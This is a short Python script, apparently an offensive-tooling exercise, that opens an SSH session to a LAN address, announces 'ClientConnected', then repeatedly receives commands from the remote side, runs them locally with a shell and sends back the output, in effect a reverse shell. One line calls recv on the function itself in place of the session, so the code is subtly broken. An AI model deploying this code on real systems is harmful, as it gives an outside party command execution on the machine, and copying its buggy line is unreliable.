import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=user, password=passwd)
        ssh_session = client.get_transport().open_session()
        if ssh_session.active:
            ssh_session.send(command)
            print(ssh_command.recv(1024).decode('utf-8'))
        while True:
            command = ssh_session.recv(1024).decode('utf-8').strip()
            if command.lower() == "exit":
                print(f"[-] Exit command received. Closing session.")
                ssh_session.close()
                break
            try:
                cmd_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                cmd_output = e.output
            ssh_session.send(cmd_output)
    except Exception as e:
        print(f"[!] SSH Connection failed: {e}")
    finally:
        client.close()

ssh_command('192.168.0.107', "Elliot Alderson", 'your_password_here', 'ClientConnected')
